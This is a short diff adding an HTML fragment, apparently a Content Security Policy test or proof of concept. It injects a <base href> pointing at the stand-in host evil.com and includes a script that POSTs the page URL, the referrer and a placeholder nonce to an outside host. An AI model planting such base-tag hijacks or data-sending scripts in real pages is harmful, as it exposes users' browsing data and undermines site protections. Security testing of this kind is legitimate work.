@@ -1,0 +1,15 @@
+<base href="https://evil.com/">
+<script>
+  fetch('https://test.shhnjk.com/report-uri', {
+    method: 'POST',
+    body: JSON.stringify({
+      cspViolation: 'CSP violation details',
+      nonce: 'secret-nonce',
+      referrer: document.referrer,
+      url: document.URL
+    }),
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  });
+</script>
